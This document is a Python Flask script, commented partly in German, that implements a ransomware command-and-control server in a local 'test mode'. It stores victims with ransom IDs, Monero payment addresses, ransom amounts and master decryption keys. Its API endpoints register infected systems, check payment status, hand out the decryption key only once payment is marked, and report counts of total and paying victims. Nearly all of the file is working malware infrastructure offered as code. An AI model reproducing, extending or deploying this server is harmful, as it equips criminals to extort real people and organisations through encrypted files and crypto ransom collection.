#!/usr/bin/env python3
"""
C2 SERVER - TEST MODE
=====================
Lokales Testing ohne Tor oder echte Monero Integration
Zeigt alle Requests und Responses
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
import sqlite3
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Database in lokalem Verzeichnis
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'test_victims.db')

# ====================
# SIMPLE DATABASE
# ====================

class TestVictimDB:
    """Simple victim database for testing"""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Create database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY,
                ransom_id TEXT UNIQUE NOT NULL,
                monero_address TEXT,
                ransom_amount_xmr REAL,
                files_encrypted INTEGER,
                data_size_gb REAL,
                infection_timestamp TEXT,
                status TEXT DEFAULT 'INFECTED',
                payment_received BOOLEAN DEFAULT 0,
                master_key TEXT,
                system_info TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        print(f"[+] Database initialized: {self.db_path}")
    
    def register_victim(self, ransom_id, monero_addr, ransom_xmr, system_info):
        """Register a victim"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            master_key = os.urandom(32).hex()
            
            cursor.execute('''
                INSERT INTO victims 
                (ransom_id, monero_address, ransom_amount_xmr, infection_timestamp, 
                 status, master_key, system_info)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                ransom_id,
                monero_addr,
                ransom_xmr,
                datetime.now().isoformat(),
                'INFECTED',
                master_key,
                json.dumps(system_info)
            ))
            
            conn.commit()
            print(f"[+] Registered victim: {ransom_id}")
            return True
        except Exception as e:
            print(f"[!] Registration error: {e}")
            return False
        finally:
            conn.close()
    
    def get_victim(self, ransom_id):
        """Get victim info"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM victims WHERE ransom_id = ?', (ransom_id,))
        row = cursor.fetchone()
        
        if not row:
            conn.close()
            return None
        
        # Convert to dict
        columns = [desc[0] for desc in cursor.description]
        conn.close()
        return dict(zip(columns, row))
    
    def mark_paid(self, ransom_id):
        """Mark as paid"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE victims 
            SET payment_received=1, status='PAID' 
            WHERE ransom_id = ?
        ''', (ransom_id,))
        
        conn.commit()
        conn.close()
        print(f"[+] Marked as paid: {ransom_id}")

# Initialize database
db = TestVictimDB(DATABASE_PATH)

# ====================
# API ENDPOINTS
# ====================

@app.route('/api/v1/register', methods=['POST'])
def register():
    """Register infected system"""
    data = request.json
    print(f"\n[*] /api/v1/register - POST Request")
    print(f"[*] Data: {json.dumps(data, indent=2)}")
    
    try:
        ransom_id = data.get('ransom_id')
        monero_addr = data.get('monero_address')
        ransom_xmr = data.get('ransom_amount_xmr')
        system_info = data.get('system_info', {})
        
        if not all([ransom_id, monero_addr, ransom_xmr]):
            print("[!] Missing required fields")
            return jsonify({'error': 'Missing required fields'}), 400
        
        success = db.register_victim(ransom_id, monero_addr, ransom_xmr, system_info)
        
        response = {
            'success': success,
            'ransom_id': ransom_id,
            'message': 'Registered successfully'
        }
        
        print(f"[+] Response: {json.dumps(response)}\n")
        return jsonify(response), 200
    
    except Exception as e:
        print(f"[!] Error: {e}\n")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/payment/status/<ransom_id>', methods=['GET'])
def payment_status(ransom_id):
    """Check payment status"""
    print(f"\n[*] /api/v1/payment/status/{ransom_id} - GET Request")
    
    try:
        victim = db.get_victim(ransom_id)
        
        if not victim:
            print("[!] Victim not found")
            return jsonify({'error': 'Victim not found'}), 404
        
        response = {
            'ransom_id': ransom_id,
            'paid': bool(victim['payment_received']),
            'status': victim['status']
        }
        
        print(f"[+] Response: {json.dumps(response)}\n")
        return jsonify(response), 200
    
    except Exception as e:
        print(f"[!] Error: {e}\n")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/decryption/key/<ransom_id>', methods=['GET'])
def get_key(ransom_id):
    """Get decryption key"""
    print(f"\n[*] /api/v1/decryption/key/{ransom_id} - GET Request")
    
    try:
        victim = db.get_victim(ransom_id)
        
        if not victim:
            print("[!] Victim not found")
            return jsonify({'error': 'Victim not found'}), 404
        
        if not victim['payment_received']:
            print("[!] Payment not verified")
            return jsonify({'error': 'Payment not verified'}), 403
        
        response = {
            'ransom_id': ransom_id,
            'master_key': victim['master_key'],
            'status': 'PAID'
        }
        
        print(f"[+] Response: {json.dumps(response)}\n")
        return jsonify(response), 200
    
    except Exception as e:
        print(f"[!] Error: {e}\n")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/admin/stats', methods=['GET'])
def stats():
    """Get statistics"""
    print(f"\n[*] /api/v1/admin/stats - GET Request")
    
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM victims')
        total = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM victims WHERE payment_received=1")
        paid = cursor.fetchone()[0]
        
        conn.close()
        
        response = {
            'total_victims': total,
            'paid_victims': paid,
            'infection_rate': f"{paid}/{total}"
        }
        
        print(f"[+] Response: {json.dumps(response)}\n")
        return jsonify(response), 200
    
    except Exception as e:
        print(f"[!] Error: {e}\n")
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/admin/pay/<ransom_id>', methods=['POST'])
def simulate_payment(ransom_id):
    """TESTING ONLY: Simulate payment"""
    print(f"\n[*] /api/v1/admin/pay/{ransom_id} - POST Request (SIMULATE PAYMENT)")
    
    try:
        db.mark_paid(ransom_id)
        
        response = {
            'ransom_id': ransom_id,
            'paid': True,
            'message': 'Payment simulated'
        }
        
        print(f"[+] Response: {json.dumps(response)}\n")
        return jsonify(response), 200
    
    except Exception as e:
        print(f"[!] Error: {e}\n")
        return jsonify({'error': str(e)}), 400

# ====================
# MAIN
# ====================

if __name__ == '__main__':
    print("\n" + "="*60)
    print("C2 SERVER - TEST MODE")
    print("="*60)
    print(f"[+] Database: {DATABASE_PATH}")
    print(f"[+] Listening on: http://127.0.0.1:5000")
    print(f"\nAPI Endpoints:")
    print(f"  POST   /api/v1/register")
    print(f"  GET    /api/v1/payment/status/<id>")
    print(f"  GET    /api/v1/decryption/key/<id>")
    print(f"  GET    /api/v1/admin/stats")
    print(f"  POST   /api/v1/admin/pay/<id>  (TESTING)")
    print("="*60 + "\n")
    
    app.run(host='127.0.0.1', port=5000, debug=False)
